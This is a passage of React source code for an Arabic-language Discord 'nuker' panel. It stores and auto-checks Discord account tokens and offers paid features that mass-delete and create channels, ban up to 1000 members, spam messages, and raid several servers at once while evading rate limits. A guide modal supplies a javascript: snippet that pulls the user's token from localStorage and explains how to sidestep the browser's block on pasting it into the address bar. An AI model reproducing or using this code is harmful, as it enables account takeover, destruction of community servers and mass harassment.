                  <button onClick={() => { if (savedTokens.length === 0) { setResult('❌ لا يوجد توكنات'); return }; setSavedTokens([]); setResult('🗑️ تم حذف جميع التوكنات') }} className="w-full py-3 rounded-xl font-bold text-xs transition-all cursor-pointer border active:scale-[0.97] bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20">🗑️ حذف الكل</button>
                </div>

                {/* مؤشر الفحص التلقائي */}
                <div className="bg-green-500/5 rounded-xl p-3 border border-green-500/15 mb-4 flex items-center gap-3">
                  <div className="relative flex items-center justify-center">
                    <div className="w-2.5 h-2.5 rounded-full bg-green-500" />
                    <div className="absolute w-2.5 h-2.5 rounded-full bg-green-500 animate-ping" />
                  </div>
                  <div className="flex-1">
                    <p className="text-[11px] text-green-400 font-bold">فحص تلقائي كل ساعة</p>
                    <p className="text-[9px] text-green-500/40">{savedTokens.length} توكن محفوظ - يتم فحصهم تلقائياً</p>
                  </div>
                </div>

                {/* قائمة التوكنات */}
                {savedTokens.length > 0 ? (
                  <div className="space-y-2 max-h-96 overflow-y-auto">
                    {savedTokens.map((st) => (
                      <div key={st.id} className={`rounded-xl p-3 border animate-fade-in ${st.status === 'valid' ? 'bg-green-500/5 border-green-500/15' : st.status === 'invalid' ? 'bg-red-500/5 border-red-500/15' : st.status === 'changed' ? 'bg-yellow-500/5 border-yellow-500/15' : 'bg-indigo-500/5 border-indigo-500/15'}`}>
                        <div className="flex items-center gap-3">
                          <div className="text-xl">{st.type === 'bot' ? '🤖' : '👤'}</div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2">
                              <span className="text-xs font-bold text-white truncate">{st.name}</span>
                              {st.prevName && <span className="text-[9px] text-yellow-400/60 truncate">(كان: {st.prevName})</span>}
                            </div>
                            <div className="flex items-center gap-2 mt-0.5">
                              <span className="text-[9px] text-white/30 font-mono">{st.token.substring(0, 20)}...</span>
                              {st.email && <span className="text-[9px] text-indigo-300/40 truncate">{st.email}</span>}
                            </div>
                          </div>
                          <div className="flex items-center gap-1.5 flex-shrink-0">
                            <div className={`text-[9px] px-2 py-1 rounded-lg font-bold ${st.status === 'valid' ? 'bg-green-500/20 text-green-400' : st.status === 'invalid' ? 'bg-red-500/20 text-red-400' : st.status === 'changed' ? 'bg-yellow-500/20 text-yellow-400' : 'bg-indigo-500/20 text-indigo-400 animate-pulse'}`}>
                              {st.status === 'valid' ? '✅ شغال' : st.status === 'invalid' ? '❌ معطل' : st.status === 'changed' ? '⚠️ تغير' : '🔄 فحص'}
                            </div>
                            <button onClick={() => { setSavedTokens(prev => prev.filter(s => s.id !== st.id)); setResult(`🗑️ تم حذف: ${st.name}`) }} className="text-[10px] text-red-400/60 bg-red-500/5 px-2 py-1 rounded-lg hover:bg-red-500/15 transition-colors cursor-pointer">✕</button>
                          </div>
                        </div>
                        {st.lastChecked && <div className="text-[9px] text-white/20 mt-1.5">آخر فحص: {st.lastChecked} | أضيف: {st.addedAt}</div>}
                        {st.prevName && st.status === 'changed' && (
                          <div className="mt-2 bg-yellow-500/10 rounded-lg p-2 border border-yellow-500/15">
                            <p className="text-[10px] text-yellow-400">⚠️ تم تغيير اسم الحساب! من "{st.prevName}" إلى "{st.name}"</p>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="bg-white/3 rounded-xl p-6 border border-white/5 text-center">
                    <div className="text-4xl mb-2">🔒</div>
                    <p className="text-xs text-white/30 mb-1">لا يوجد توكنات محفوظة</p>
                    <p className="text-[10px] text-white/20">ضع توكن فوق واضغط حفظ - راح يثبت ويتراقب تلقائياً</p>
                  </div>
                )}
              </div></div>
            )}

            {/* ==================== PRIME FEATURES - ميزات حصرية ==================== */}

            {/* Prime Nuker - نيوكر فائق السرعة */}
            {section === 'prime-nuker' && (
              <div className="animate-fade-in relative">
                {!isPrime && (
                  <div className="prime-lock-overlay rounded-2xl">
                    <div className="prime-lock-icon">⭐</div>
                    <div className="text-center">
                      <p className="text-sm font-bold text-yellow-400 mb-1">ميزة Prime حصرية</p>
                      <p className="text-[10px] text-yellow-300/50 mb-4">نيوكر فائق السرعة - 500 روم + 1000 حظر بالتوازي</p>
                      <button onClick={() => setShowPrimeModal(true)} className="btn-prime">⭐ تفعيل Prime</button>
                    </div>
                  </div>
                )}
                <div className={`glass-card card-hover rounded-2xl p-6 border border-yellow-500/20 shadow-xl shadow-black/20 ${!isPrime ? 'blur-sm' : ''}`}>
                  <div className="flex items-center gap-3 mb-1">
                    <span className="text-2xl">💀</span>
                    <h2 className="text-xl font-black text-yellow-400">⚡ نيوكر سريع - Prime</h2>
                    <span className="text-[10px] bg-yellow-500/20 text-yellow-400 px-2 py-0.5 rounded-full font-bold">PRIME</span>
                  </div>
                  <p className="text-slate-500 text-sm mb-5">🔥 فائق السرعة - 500 روم بالتوازي + 1000 حظر/طرد بالتوازي + تجاوز Rate Limit</p>
                  <TokenInput label="🎫 التوكن" value={nukerToken} onChange={setNukerToken} accent="yellow" onHelp={() => setShowTokenGuide(true)} />
                  <TextInput label="📋 أيدي السيرفر" value={guildId} onChange={setGuildId} placeholder="Guild ID" accent="yellow" />
                  <div className="grid grid-cols-2 gap-2 mb-4">
                    <div><label className="text-[11px] text-yellow-300/70">اسم الرومات</label><input type="text" value={nukeChannelName} onChange={e => setNukeChannelName(e.target.value)} className="w-full bg-black/30 border border-yellow-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none" /></div>
                    <div><label className="text-[11px] text-yellow-300/70">عدد الرومات (max 500)</label><input type="number" value={nukeChannelCount} onChange={e => setNukeChannelCount(Math.min(Number(e.target.value), 500))} className="w-full bg-black/30 border border-yellow-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none" /></div>
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                    <NukerBtn text="⚡ تدمير فائق" color="yellow" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'destroy', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: 100, message: nukeMsg })} />
                    <NukerBtn text="🔨 حظر 1000" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'massban', count: 1000 })} />
                  </div>
                </div>
              </div>
            )}

            {/* Prime Raid Mode */}
            {section === 'prime-raid' && (
              <div className="animate-fade-in relative">
                {!isPrime && (
                  <div className="prime-lock-overlay rounded-2xl">
                    <div className="prime-lock-icon">💣</div>
                    <div className="text-center">
                      <p className="text-sm font-bold text-yellow-400 mb-1">ميزة Prime حصرية</p>
                      <p className="text-[10px] text-yellow-300/50 mb-4">Raid Mode - تدمير متعدد السيرفرات</p>
                      <button onClick={() => setShowPrimeModal(true)} className="btn-prime">⭐ تفعيل Prime</button>
                    </div>
                  </div>
                )}
                <div className={`glass-card card-hover rounded-2xl p-6 border border-red-500/20 shadow-xl shadow-black/20 ${!isPrime ? 'blur-sm' : ''}`}>
                  <div className="flex items-center gap-3 mb-1">
                    <span className="text-2xl">💣</span>
                    <h2 className="text-xl font-black text-red-400">🔥 Raid Mode</h2>
                    <span className="text-[10px] bg-red-500/20 text-red-400 px-2 py-0.5 rounded-full font-bold">PRIME</span>
                  </div>
                  <p className="text-slate-500 text-sm mb-5">🔥 تدمير متعدد السيرفرات - ضع عدة أيديات ودمّرهم مرة واحدة</p>
                  <TokenInput label="🎫 التوكن" value={nukerToken} onChange={setNukerToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
                  <div className="mb-4">
                    <label className="text-[11px] text-red-300/70">📋 أيديات السيرفرات (كل سطر = سيرفر)</label>
                    <textarea value={guildId} onChange={e => setGuildId(e.target.value)} placeholder="Guild ID 1&#10;Guild ID 2&#10;Guild ID 3" rows={4} className="w-full bg-black/30 border border-red-500/30 rounded-xl px-4 py-3 text-white text-sm mt-1 focus:outline-none resize-none" />
                  </div>
                  <div className="grid grid-cols-3 gap-2">
                    <NukerBtn text="💥 Raid الكل" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildIds: guildId.split('\n').filter(Boolean), action: 'raid' })} />
                    <NukerBtn text="🔨 حظر الكل" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildIds: guildId.split('\n').filter(Boolean), action: 'massban' })} />
                    <NukerBtn text="📢 سبام الكل" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildIds: guildId.split('\n').filter(Boolean), action: 'massspam' })} />
                  </div>
                </div>
              </div>
            )}

            {/* ===== RESULT ===== */}
            {result && (<div className={`mt-4 p-4 rounded-2xl text-sm font-medium border animate-fade-in whitespace-pre-line ${result.startsWith('✅') ? 'bg-green-500/10 text-green-400 border-green-500/20 text-left' : 'bg-red-500/10 text-red-400 border-red-500/20 text-center'}`}>{result}</div>)}

            {/* ===== STATS ===== */}
            {stats && (<div className="mt-4 glass-card rounded-2xl p-4 border border-slate-700/30 animate-fade-in"><div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-center">
              {stats.deleted !== undefined && stats.deleted > 0 && (<div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10"><div className="text-2xl font-black text-red-400 stat-number">{stats.deleted}</div><div className="text-[10px] text-red-300/60">محذوف</div></div>)}
              {stats.created !== undefined && stats.created > 0 && (<div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10"><div className="text-2xl font-black text-green-400 stat-number">{stats.created}</div><div className="text-[10px] text-green-300/60">منشأ</div></div>)}
              {stats.spam_sent !== undefined && stats.spam_sent > 0 && (<div className="bg-orange-500/8 rounded-xl p-3 border border-orange-500/10"><div className="text-2xl font-black text-orange-400 stat-number">{stats.spam_sent}</div><div className="text-[10px] text-orange-300/60">سبام</div></div>)}
              {stats.banned !== undefined && stats.banned > 0 && (<div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10"><div className="text-2xl font-black text-red-500 stat-number">{stats.banned}</div><div className="text-[10px] text-red-400/60">محظور</div></div>)}
              {stats.roles !== undefined && stats.roles > 0 && (<div className="bg-purple-500/8 rounded-xl p-3 border border-purple-500/10"><div className="text-2xl font-black text-purple-400 stat-number">{stats.roles}</div><div className="text-[10px] text-purple-300/60">رتب</div></div>)}
              {stats.sent !== undefined && stats.sent > 0 && (<div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10"><div className="text-2xl font-black text-green-400 stat-number">{stats.sent}</div><div className="text-[10px] text-green-300/60">مرسلة</div></div>)}
              {stats.failed !== undefined && stats.failed > 0 && (<div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10"><div className="text-2xl font-black text-red-400 stat-number">{stats.failed}</div><div className="text-[10px] text-red-300/60">فشل</div></div>)}
              {stats.blocked !== undefined && stats.blocked > 0 && (<div className="bg-yellow-500/8 rounded-xl p-3 border border-yellow-500/10"><div className="text-2xl font-black text-yellow-400 stat-number">{stats.blocked}</div><div className="text-[10px] text-yellow-300/60">محظور DM</div></div>)}
              {stats.left !== undefined && stats.left > 0 && (<div className="bg-orange-500/8 rounded-xl p-3 border border-orange-500/10"><div className="text-2xl font-black text-orange-400 stat-number">{stats.left}</div><div className="text-[10px] text-orange-300/60">مغادرة</div></div>)}
              {stats.txt !== undefined && stats.txt > 0 && (<div className="bg-blue-500/8 rounded-xl p-3 border border-blue-500/10"><div className="text-2xl font-black text-blue-400 stat-number">{stats.txt}</div><div className="text-[10px] text-blue-300/60">روم كتابي</div></div>)}
              {stats.voice !== undefined && stats.voice > 0 && (<div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10"><div className="text-2xl font-black text-green-400 stat-number">{stats.voice}</div><div className="text-[10px] text-green-300/60">روم صوتي</div></div>)}
              {stats.cats !== undefined && stats.cats > 0 && (<div className="bg-indigo-500/8 rounded-xl p-3 border border-indigo-500/10"><div className="text-2xl font-black text-indigo-400 stat-number">{stats.cats}</div><div className="text-[10px] text-indigo-300/60">كاتيجوري</div></div>)}
              {stats.emojis !== undefined && stats.emojis > 0 && (<div className="bg-pink-500/8 rounded-xl p-3 border border-pink-500/10"><div className="text-2xl font-black text-pink-400 stat-number">{stats.emojis}</div><div className="text-[10px] text-pink-300/60">إيموجي</div></div>)}
              {stats.kicked !== undefined && stats.kicked > 0 && (<div className="bg-orange-500/8 rounded-xl p-3 border border-orange-500/10"><div className="text-2xl font-black text-orange-400 stat-number">{stats.kicked}</div><div className="text-[10px] text-orange-300/60">مطرود</div></div>)}
              {stats.permissions !== undefined && stats.permissions > 0 && (<div className="bg-cyan-500/8 rounded-xl p-3 border border-cyan-500/10"><div className="text-2xl font-black text-cyan-400 stat-number">{stats.permissions}</div><div className="text-[10px] text-cyan-300/60">صلاحية</div></div>)}
            </div></div>)}

          </div>
        </main>

        {/* Footer */}
        <div className="max-w-4xl mx-auto px-4 pb-24 lg:pb-8">
          <div className="pt-6 mt-6 border-t border-white/5 text-center">
            <p className="text-[11px] text-white/20">جميع حقوق محفوظه لدى Trojan .#1888</p>
          </div>
        </div>

        <TokenGuideModal show={showTokenGuide} onClose={() => setShowTokenGuide(false)} onTokenExtracted={(token) => { setVerifyToken(token); setShowTokenGuide(false); }} />
        <ProfileModal show={showProfile} onClose={() => setShowProfile(false)} />
        <FeedbackModal
          show={showFeedbackModal}
          onClose={() => setShowFeedbackModal(false)}
          type={feedbackType}
          isPrime={isPrime}
          userId={primeUserId}
          username={primeUsername}
        />
        <PrimeModal show={showPrimeModal} onClose={() => setShowPrimeModal(false)} isPrime={isPrime} onActivate={(uid, uname) => { setIsPrime(true); if (uid) setPrimeUserId(uid); if (uname) setPrimeUsername(uname); }} />
      </div>
      </>
      )}

      {/* ===== VISITOR COUNTER ===== */}
      <VisitorCounter />
    </div>
  )
}

/* ==================== UI COMPONENTS ==================== */

function TokenInput({ label, value, onChange, accent = 'green', onHelp }: { label: string; value: string; onChange: (v: string) => void; accent?: string; onHelp?: () => void }) {
  const [showPw, setShowPw] = useState(false)
  const colors: Record<string, string> = { green: 'border-green-500/30 focus:border-green-400/50', red: 'border-red-500/30 focus:border-red-400/50', orange: 'border-orange-500/30 focus:border-orange-400/50', purple: 'border-purple-500/30 focus:border-purple-400/50', yellow: 'border-yellow-500/30 focus:border-yellow-400/50', cyan: 'border-cyan-500/30 focus:border-cyan-400/50', pink: 'border-pink-500/30 focus:border-pink-400/50' }
  return (<div className="mb-4"><div className="flex items-center justify-between mb-1"><label className="text-[11px] text-white/50">{label}</label>{onHelp && (<button onClick={onHelp} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2 py-0.5 rounded-md border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer">📖 كيف تجيب التوكن؟</button>)}</div><div className="relative"><input type={showPw ? 'text' : 'password'} value={value} onChange={e => onChange(e.target.value)} placeholder="••••••••" className={`w-full bg-black/30 border ${colors[accent] || colors.green} rounded-xl px-4 py-3 text-white text-sm pr-16 placeholder-white/20 focus:outline-none transition-colors`} /><div className="absolute right-2 top-1/2 -translate-y-1/2 flex gap-1"><button onClick={() => setShowPw(!showPw)} className="text-[10px] text-white/40 bg-white/5 px-2 py-1 rounded-lg hover:bg-white/10 transition-colors cursor-pointer border border-white/10">{showPw ? '🙈' : '👁'}</button><button onClick={() => { navigator.clipboard.writeText(value).catch(() => { const inp = document.createElement('input'); inp.value = value; document.body.appendChild(inp); inp.select(); document.execCommand('copy'); document.body.removeChild(inp); }); }} className="text-[10px] text-white/40 bg-white/5 px-2 py-1 rounded-lg hover:bg-white/10 transition-colors cursor-pointer border border-white/10">📋</button></div></div></div>)
}

function TextInput({ label, value, onChange, placeholder, accent = 'green', type = 'text' }: { label: string; value: string; onChange: (v: string) => void; placeholder: string; accent?: string; type?: string }) {
  const colors: Record<string, string> = { green: 'border-green-500/30 focus:border-green-400/50', red: 'border-red-500/30 focus:border-red-400/50', orange: 'border-orange-500/30 focus:border-orange-400/50', purple: 'border-purple-500/30 focus:border-purple-400/50', yellow: 'border-yellow-500/30 focus:border-yellow-400/50', cyan: 'border-cyan-500/30 focus:border-cyan-400/50', pink: 'border-pink-500/30 focus:border-pink-400/50', amber: 'border-amber-500/30 focus:border-amber-400/50', emerald: 'border-emerald-500/30 focus:border-emerald-400/50' }
  return (<div className="mb-4"><label className="text-[11px] text-white/50 mb-1 block">{label}</label><input type={type} value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} className={`w-full bg-black/30 border ${colors[accent] || colors.green} rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none transition-colors`} /></div>)
}

function ActionBtn({ text, loading, onClick, color = 'green' }: { text: string; loading: boolean; onClick: () => void; color?: string }) {
  const colors: Record<string, string> = { green: 'bg-green-500/20 hover:bg-green-500/30 text-green-400 border-green-500/30', red: 'bg-red-500/20 hover:bg-red-500/30 text-red-400 border-red-500/30', orange: 'bg-orange-500/20 hover:bg-orange-500/30 text-orange-400 border-orange-500/30', purple: 'bg-purple-500/20 hover:bg-purple-500/30 text-purple-400 border-purple-500/30', yellow: 'bg-yellow-500/20 hover:bg-yellow-500/30 text-yellow-400 border-yellow-500/30', cyan: 'bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-400 border-cyan-500/30', pink: 'bg-pink-500/20 hover:bg-pink-500/30 text-pink-400 border-pink-500/30', amber: 'bg-amber-500/20 hover:bg-amber-500/30 text-amber-400 border-amber-500/30' }
  return (<button onClick={onClick} disabled={loading} className={`w-full py-3 rounded-xl font-bold text-sm transition-all cursor-pointer border ${colors[color] || colors.green} ${loading ? 'opacity-50 cursor-not-allowed' : 'active:scale-[0.98]'}`}>{loading ? '⏳ جاري...' : text}</button>)
}

function NukerBtn({ text, color, loading, onClick }: { text: string; color: string; loading: boolean; onClick: () => void }) {
  const colors: Record<string, string> = { red: 'bg-red-500/20 hover:bg-red-500/30 text-red-400 border-red-500/30', gray: 'bg-white/5 hover:bg-white/10 text-white/70 border-white/10', orange: 'bg-orange-500/20 hover:bg-orange-500/30 text-orange-400 border-orange-500/30', cyan: 'bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-400 border-cyan-500/30', purple: 'bg-purple-500/20 hover:bg-purple-500/30 text-purple-400 border-purple-500/30', yellow: 'bg-yellow-500/20 hover:bg-yellow-500/30 text-yellow-400 border-yellow-500/30', green: 'bg-green-500/20 hover:bg-green-500/30 text-green-400 border-green-500/30', pink: 'bg-pink-500/20 hover:bg-pink-500/30 text-pink-400 border-pink-500/30' }
  return (<button onClick={onClick} disabled={loading} className={`w-full py-2.5 rounded-xl font-bold text-xs transition-all cursor-pointer border ${colors[color] || colors.gray} ${loading ? 'opacity-50 cursor-not-allowed' : 'active:scale-[0.98]'}`}>{loading ? '⏳' : text}</button>)
}

function InfoPill({ label, value }: { label: string; value: string }) {
  return (<div className="bg-black/20 rounded-xl px-3 py-2 border border-white/5 text-center"><div className="text-[10px] text-white/40">{label}</div><div className="text-xs text-green-300 font-medium mt-0.5">{value}</div></div>)
}

function TokenGuideModal({ show, onClose, onTokenExtracted }: { show: boolean; onClose: () => void; onTokenExtracted?: (token: string) => void }) {
  const urlCode = `(function(){location.reload();var i=document.createElement('iframe');document.body.appendChild(i);document.write(i.contentWindow.localStorage.token)})()`
  const fullCode = `javascript:${urlCode}`

  const [phase, setPhase] = useState<'main' | 'guide'>('main')
  const [tokenInput, setTokenInput] = useState('')
  const [copiedCode, setCopiedCode] = useState(false)
  const [autoPasted, setAutoPasted] = useState(false)
  const [tokenValid, setTokenValid] = useState<boolean | null>(null)

  const copyUrlCode = () => {
    navigator.clipboard.writeText(urlCode).then(() => {
      setCopiedCode(true); setTimeout(() => setCopiedCode(false), 3000)
    }).catch(() => {
      const ta = document.createElement('textarea'); ta.value = urlCode; ta.style.position = 'fixed'; ta.style.left = '-9999px'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta)
      setCopiedCode(true); setTimeout(() => setCopiedCode(false), 3000)
    })
  }

  const startExtract = () => {
    copyUrlCode()
    setPhase('guide')
    setTimeout(() => {
      try { navigator.clipboard.readText().then(text => { if (text && text.length > 50 && text.includes('.')) { setTokenInput(text); setAutoPasted(true); setTokenValid(/^[A-Za-z0-9._-]+$/.test(text) && text.length > 50) } }).catch(() => {}) } catch {}
    }, 8000)
  }

  const handleTokenSubmit = () => {
    if (tokenInput.length > 50) { setTokenValid(true); if (onTokenExtracted) onTokenExtracted(tokenInput) }
  }

  useEffect(() => {
    if (show) { const id = requestAnimationFrame(() => { setPhase('main'); setTokenInput(''); setAutoPasted(false); setTokenValid(null) }); return () => cancelAnimationFrame(id) }
  }, [show])

  if (!show) return null

  return (
    <div className="fixed inset-0 z-[100] flex items-end sm:items-center justify-center p-0 sm:p-4" onClick={onClose}>
      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" />
      <div className="relative bg-[#0a0e14] border border-green-500/20 rounded-t-2xl sm:rounded-2xl w-full sm:max-w-md shadow-2xl shadow-green-500/10 animate-slide-up max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
        <div className="p-5">

          {/* Header */}
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2">
              <span className="text-xl">🎫</span>
              <h3 className="font-black text-green-400 text-sm">كيف تجيب توكن</h3>
            </div>
            <button onClick={onClose} className="w-7 h-7 rounded-full bg-white/5 flex items-center justify-center text-white/40 hover:text-white/80 hover:bg-white/10 cursor-pointer transition-colors text-sm">✕</button>
          </div>

          {phase === 'main' && (
            <>
              <div className="text-center mb-5">
                <div className="text-6xl mb-4">🔑</div>
                <p className="text-lg text-white/90 font-black mb-2">جلب التوكن بسهولة!</p>
                <p className="text-[11px] text-white/30 leading-relaxed max-w-xs mx-auto">
                  طريق سهل ومباشر - فقط ركب الكود في شريط العنوان
                </p>
              </div>

              <button onClick={startExtract} className="w-full py-6 rounded-2xl font-black text-xl transition-all cursor-pointer border active:scale-[0.97] mb-4 flex items-center justify-center gap-3 bg-gradient-to-r from-green-600/30 to-emerald-500/30 text-green-300 border-green-500/40 hover:from-green-600/40 hover:to-emerald-500/40 shadow-xl shadow-green-500/10">
                <span className="text-3xl">⚡</span>
                ابدأ - جلب التوكن
              </button>

              {/* 3-step preview */}
              <div className="grid grid-cols-3 gap-2 mb-3">
                <div className="bg-green-500/5 rounded-xl p-3 border border-green-500/10 text-center">
                  <div className="text-lg mb-1">1️⃣</div>
                  <p className="text-[9px] text-green-300/60">اضغط الزر</p>
                </div>
                <div className="bg-cyan-500/5 rounded-xl p-3 border border-cyan-500/10 text-center">
                  <div className="text-lg mb-1">2️⃣</div>
                  <p className="text-[9px] text-cyan-300/60">اركب في URL</p>
                </div>
                <div className="bg-purple-500/5 rounded-xl p-3 border border-purple-500/10 text-center">
                  <div className="text-lg mb-1">3️⃣</div>
                  <p className="text-[9px] text-purple-300/60">انسخ التوكن</p>
                </div>
              </div>

              <div className="bg-yellow-500/5 rounded-xl p-3 border border-yellow-500/10">
                <p className="text-[10px] text-yellow-300/50 text-center leading-relaxed">
                  ⚠️ لازم تكون مسجل دخول في ديسكورد على المتصفح
                </p>
              </div>

              {/* فيديو */}
              <div className="bg-red-500/5 rounded-xl p-3 border border-red-500/15 mt-3">
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-sm">🎥</span>
                  <span className="text-[11px] text-red-400 font-bold">شرح بالفيديو</span>
                </div>
                <a href="https://www.youtube.com/shorts/owx2Y1FagFQ" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 py-3 rounded-xl bg-red-500/10 border border-red-500/20 hover:bg-red-500/20 transition-colors cursor-pointer">
                  <span className="text-lg">▶️</span>
                  <span className="text-xs text-red-300 font-bold">مشاهدة الشرح على يوتيوب</span>
                </a>
              </div>
            </>
          )}

          {phase === 'guide' && (
            <>
              {/* Progress */}
              <div className="flex gap-1 mb-5">
                {[
                  { label: 'نسخ', icon: copiedCode ? '✅' : '📋', color: copiedCode ? 'green' : 'white' },
                  { label: 'URL', icon: '🔗', color: 'cyan' },
                  { label: 'توكن', icon: '🎫', color: 'purple' },
                ].map((s, i) => (
                  <div key={i} className="flex-1 text-center">
                    <div className={`text-[10px] mb-1 ${s.color === 'green' ? 'text-green-400' : s.color === 'cyan' ? 'text-cyan-400' : 'color' in s && s.color === 'purple' ? 'text-purple-400' : 'text-white/30'}`}>
                      {s.icon} {s.label}
                    </div>
                    <div className={`h-1 rounded-full ${i === 0 ? (copiedCode ? 'bg-green-500' : 'bg-white/10') : i === 1 ? 'bg-cyan-500/30' : 'bg-purple-500/30'}`} />
                  </div>
                ))}
              </div>

              {/* Steps */}
              <div className="space-y-3 mb-5">
                {/* Step 1 */}
                <div className={`rounded-2xl p-4 border transition-all ${copiedCode ? 'bg-green-500/8 border-green-500/20' : 'bg-white/3 border-white/5'}`}>
                  <div className="flex items-center gap-3">
                    <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-black flex-shrink-0 ${copiedCode ? 'bg-green-500/30 text-green-400' : 'bg-white/10 text-white/40'}`}>
                      {copiedCode ? '✓' : '1'}
                    </div>
                    <div>
                      <p className={`text-xs font-bold ${copiedCode ? 'text-green-400' : 'text-white/50'}`}>تم نسخ الكود</p>
                      <p className="text-[10px] text-white/25 mt-0.5">الكود في الحافظة جاهز</p>
                    </div>
                  </div>
                </div>

                {/* Step 2 - URL Bar Method */}
                <div className="rounded-2xl p-4 border bg-cyan-500/5 border-cyan-500/15">
                  <div className="flex items-start gap-3">
                    <div className="w-8 h-8 rounded-full bg-cyan-500/20 text-cyan-400 text-sm font-black flex items-center justify-center flex-shrink-0">2</div>
                    <div className="flex-1">
                      <p className="text-xs font-bold text-cyan-400 mb-2">اذهب لديسكورد واركب الكود في شريط العنوان (URL)</p>

                      {/* Visual URL bar */}
                      <div className="bg-black/40 rounded-xl p-2.5 border border-white/10 mb-3">
                        <div className="flex items-center gap-2">
                          <div className="bg-green-500/20 rounded-lg px-1.5 py-1 text-[9px] font-mono text-green-400 font-bold flex-shrink-0">🔒</div>
                          <div className="flex-1 bg-white/5 rounded-lg px-2.5 py-1.5 text-[9px] font-mono overflow-hidden">
                            <span className="text-cyan-400 font-bold">{'javascript:'}</span><span className="text-white/50">{'(function(){location.reload()...'}</span>
                          </div>
                        </div>
                      </div>

                      <div className="space-y-2">
                        <div className="flex items-start gap-2">
                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">أ.</span>
                          <p className="text-[10px] text-white/50">افتح ديسكورد على المتصفح <span className="text-cyan-400/70 font-bold">discord.com/app</span></p>
                        </div>
                        <div className="flex items-start gap-2">
                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">ب.</span>
                          <p className="text-[10px] text-white/50">اضغط على شريط العنوان (URL bar) في الأعلى</p>
                        </div>
                        <div className="flex items-start gap-2">
                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">ج.</span>
                          <p className="text-[10px] text-white/50"><span className="text-yellow-400 font-bold">الصق الكود</span> في شريط العنوان</p>
                        </div>
                        <div className="flex items-start gap-2">
                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">د.</span>
                          <div>
                            <p className="text-[10px] text-white/50">روح <span className="text-yellow-400 font-bold">آخر سطر</span> (بعد الكود) واكتب يدوياً:</p>
                            <div className="bg-yellow-500/10 rounded-lg px-2.5 py-1.5 mt-1 border border-yellow-500/20">
                              <code className="text-[10px] text-yellow-300 font-mono font-bold">javascript:</code>
                            </div>
                          </div>
                        </div>
                        <div className="flex items-start gap-2">
                          <span className="text-[10px] text-cyan-400 font-bold flex-shrink-0 mt-0.5">ه.</span>
                          <p className="text-[10px] text-white/50">اضغط <span className="text-green-400 font-bold">Enter</span></p>
                        </div>
                      </div>

                      {/* Important note about javascript: */}
                      <div className="bg-yellow-500/5 rounded-xl p-3 border border-yellow-500/20 mt-3">
                        <p className="text-[10px] text-yellow-300/70 font-bold mb-1">⚠️ ليه لازم تكتب javascript: يدوياً؟</p>
                        <p className="text-[9px] text-yellow-300/50 leading-relaxed">المتصفح يمنع لصق كلمة javascript: لأسباب أمنية. عشان كذا لازم تكتبها يدوياً بنفسك في بداية السطر. بس اكتبها واضغط Enter وراح يشتغل مباشرة!</p>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Step 3 - Result */}
                <div className="rounded-2xl p-4 border bg-purple-500/5 border-purple-500/15">
                  <div className="flex items-start gap-3">
                    <div className="w-8 h-8 rounded-full bg-purple-500/20 text-purple-400 text-sm font-black flex items-center justify-center flex-shrink-0">3</div>
                    <div className="flex-1">
                      <p className="text-xs font-bold text-purple-400 mb-2">توكن يظهر على الشاشة</p>
                      <p className="text-[10px] text-white/40 mb-2">بعد ما تضغط Enter، الصفحة تتحمل وتظهر التوكن. انسخه كامل!</p>
                      <div className="bg-black/30 rounded-xl p-3 border border-white/5">
                        <div className="bg-white/5 rounded-lg p-2 border border-white/10">
                          <p className="text-[9px] text-green-400 font-mono truncate">eyJhbGciOiJIUzI1NiJ9.eyJpZCI6I...</p>
                        </div>
                        <p className="text-[9px] text-purple-300/40 mt-2 text-center">انسخ التوكن الظاهر (Ctrl+C)</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Token paste area */}
              <div className="bg-green-500/5 rounded-2xl p-4 border border-green-500/20 mb-4">
                <div className="flex items-center gap-2 mb-3">
                  <span className="text-sm">📋</span>
                  <p className="text-xs font-bold text-green-400">
                    {autoPasted ? '✅ تم التلقائي! تأكد و اضغط استخدام' : 'الصق التوكن هنا'}
                  </p>
                </div>
                <div className="flex gap-2">
